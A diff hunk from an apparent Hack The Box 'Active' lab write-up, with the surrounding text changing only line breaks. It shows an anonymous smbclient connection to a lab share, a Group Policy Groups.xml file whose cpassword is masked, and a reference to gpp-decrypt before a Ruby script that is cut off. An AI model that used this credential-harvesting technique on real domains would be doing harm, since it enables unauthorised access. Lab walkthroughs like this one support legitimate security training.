@@ -187,15 +187,13 @@ SMB         10.129.190.90   445    DC               Users
 ```bash
 smbclient \\\\active.htb\\Replication -I 10.129.190.90 -N
 ```
-> Enumerating the share we find Groups.xml in the path `\\active.htb\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\`
-> we can decrypt the "cpassword" variable and get a password
+> Enumerating the share we find Groups.xml in the path `\\active.htb\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\` we can decrypt the "cpassword" variable and get a password
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="xxxxxxxxxxxxxxxxxxxxxxxx" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
 ```
-> With a quick google search of `group policy password decrypt` we will find a tool called [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
-> due to the way my machine is configured I will instead use a ruby script that does the samething
+> With a quick google search of `group policy password decrypt` we will find a tool called [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) due to the way my machine is configured I will instead use a ruby script that does the samething
 
 ```ruby
 require 'rubygems'
